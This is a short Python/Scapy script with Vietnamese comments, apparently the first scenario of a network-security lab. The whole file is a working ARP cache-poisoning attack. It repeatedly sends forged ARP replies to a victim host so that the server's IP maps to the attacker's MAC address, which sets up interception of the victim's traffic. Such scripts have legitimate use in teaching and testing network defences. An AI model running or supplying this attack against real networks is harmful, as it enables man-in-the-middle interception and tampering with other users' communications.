#!/usr/bin/env python3
"""
Kịch bản 1: Tấn công ARP Cache Poisoning bằng gói tin ARP Reply
Đầu độc bảng ARP của User (10.2.6.10) để map IP Server (10.2.6.20) về MAC Attacker
"""
from scapy.all import *
import time

IP_VICTIM = "10.2.6.10"       # User
IP_SPOOFED = "10.2.6.20"      # Server
MAC_ATTACKER = get_if_hwaddr("eth0")

print(f"[*] Attacker MAC : {MAC_ATTACKER}")
print(f"[*] Target Victim: {IP_VICTIM}")
print(f"[*] Spoofing     : {IP_SPOOFED} -> MAC {MAC_ATTACKER}")
print("[*] Gui ARP Reply lien tuc den nan nhan... (Nhan Ctrl+C de dung)")

# Tao goi ARP Reply (op=2)
# hwsrc: MAC Attacker, psrc: IP Server, pdst: IP User
pkt = Ether(src=MAC_ATTACKER)/ARP(
    hwsrc=MAC_ATTACKER,
    psrc=IP_SPOOFED,
    pdst=IP_VICTIM,
    op=2
)

try:
    while True:
        sendp(pkt, iface="eth0", verbose=0)
        print(f"[+] [Kich ban 1] Sent ARP Reply: {IP_SPOOFED} is-at {MAC_ATTACKER} to {IP_VICTIM}")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Da dung kich ban 1.")
